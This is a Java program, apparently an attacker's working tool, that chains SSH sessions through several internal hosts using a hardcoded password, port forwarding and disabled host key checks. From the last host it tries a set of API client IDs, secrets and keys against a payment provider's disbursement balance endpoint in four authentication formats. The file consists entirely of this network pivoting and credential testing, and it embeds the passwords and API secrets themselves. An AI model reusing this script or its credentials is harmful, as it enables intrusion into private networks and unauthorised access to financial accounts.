import com.jcraft.jsch.*;
import java.io.*;
class DFZ {
  public static void main(String[] a) throws Exception {
    JSch j = new JSch();
    java.util.Properties p = new java.util.Properties();
    p.put("StrictHostKeyChecking", "no");
    Session s1 = j.getSession("user", "10.14.36.23", 22);
    s1.setPassword("kutul0nc4t");
    s1.setConfig(p);
    s1.setTimeout(10000);
    s1.connect();
    int fwd1 = s1.setPortForwardingL(0, "10.13.16.117", 22);
    Session s2 = j.getSession("user", "127.0.0.1", fwd1);
    s2.setPassword("kutul0nc4t");
    s2.setConfig(p);
    s2.setTimeout(8000);
    s2.connect();
    ChannelExec ch = (ChannelExec) s2.openChannel("exec");
    ch.setCommand("sshpass -p kutul0nc4t ssh -o StrictHostKeyChecking=no user@10.13.16.196 '" +
      "echo ---TRY1-BASIC-AUTH---;curl -s --max-time 5 -u \"9ff4a14c3016ded8274d686a71c6666b:c8277ac098bb1ac99b90210269f71b90\" https://open-api.paper.id/api/v1/disbursement/balance 2>/dev/null | head -3;" +
      "echo ---TRY2-API-KEY-HEADER---;curl -s --max-time 5 -H \"X-Api-Key: pd8mmYh0yY9H8\" -H \"client-id: 9ff4a14c3016ded8274d686a71c6666b\" -H \"client-secret: c8277ac098bb1ac99b90210269f71b90\" https://open-api.paper.id/api/v1/disbursement/balance 2>/dev/null | head -3;" +
      "echo ---TRY3-BEARER-KEY---;curl -s --max-time 5 -H \"Authorization: Bearer pd8mmYh0yY9H8\" https://open-api.paper.id/api/v1/disbursement/balance 2>/dev/null | head -3;" +
      "echo ---TRY4-PARTNER---;curl -s --max-time 5 -H \"x-partner-id: pd8mmYh0yY9H8\" -H \"x-client-id: 9ff4a14c3016ded8274d686a71c6666b\" -H \"x-client-secret: c8277ac098bb1ac99b90210269f71b90\" https://open-api.paper.id/api/v1/disbursement/balance 2>/dev/null | head -3' 2>&1");
    ch.setInputStream(null);
    InputStream in = ch.getInputStream();
    ch.connect();
    byte[] buf = new byte[8192];
    int i;
    while ((i = in.read(buf)) != -1) System.out.write(buf, 0, i);
    ch.disconnect();
    s2.disconnect();
    s1.disconnect();
  }
}
